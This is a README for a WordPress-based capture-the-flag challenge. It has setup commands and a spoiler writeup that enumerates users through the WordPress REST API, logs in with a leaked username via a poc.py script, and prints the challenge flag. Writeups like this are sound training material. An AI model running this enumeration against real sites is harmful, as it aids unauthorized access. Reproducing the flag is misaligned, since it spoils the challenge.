# Sitefari

A simple <ins>web</ins> challenge where the players are given a single port.

## How to run

The image was tested with podman, but should work fine with docker as well.

0. Clone the repo and cd to the root folder of the particular challenge
1. Build the image: `podman build -t ctf-sitefari:latest .`
2. Run the image: `podman rm -f ctf-sitefari; podman run --rm -it -p 8080:8080 --name ctf-sitefari ctf-sitefari:latest`
3. Share the port with the players

<details>
<summary>Writeup (Spoiler)</summary>

There seems to be a wordpress site if we run `curl localhost:8080` and examine the headers, but it's quite broken due to the redirects. Let's see if we can evaluate users at least:

```
[steve@todo ~]$ curl 'http://localhost:8080/wp-json/wp/v2/users' && echo
[{"id":1,"name":"sitefari-admin","url":"http:\/\/localhost:8080","description":"Note to authors. Write articles in the name of annabellewallis in the future!","link":"http:\/\/localhost:45619\/author\/sitefari-admin\/","slug":"sitefari-admin","avatar_urls":{"24":"http:\/\/1.gravatar.com\/avatar\/a82f40a10eda48040accce8dcb6eef05?s=24&d=mm&r=g","48":"http:\/\/1.gravatar.com\/avatar\/a82f40a10eda48040accce8dcb6eef05?s=48&d=mm&r=g","96":"http:\/\/1.gravatar.com\/avatar\/a82f40a10eda48040accce8dcb6eef05?s=96&d=mm&r=g"},"meta":[],"_links":{"self":[{"href":"http:\/\/localhost:45619\/wp-json\/wp\/v2\/users\/1"}],"collection":[{"href":"http:\/\/localhost:45619\/wp-json\/wp\/v2\/users"}]}}]
[steve@todo ~]$
```

And we have an interesting note there that suggests that we have an `annabellewallis` user. Let's try to log-in using these credentials. I will use the provided [poc.py](poc.py) script for this:

```
[steve@todo ctf-sitefari]$ python3 ./poc.py 
Description: Note to authors. Write articles in the name of annabellewallis in the future!
Username: annabellewallis
Response: 200
Flag: cq23{WP_s3cur1ty_4t_1t5_fiNEST_be5abd115b783b87e5394a7f6bf9265d}
```

And there it goes. We can't actually log-in to that user, but instead it displays the flag and tells us that the account is disabled. Poor wordpress security, poor annabellewallis.
</details>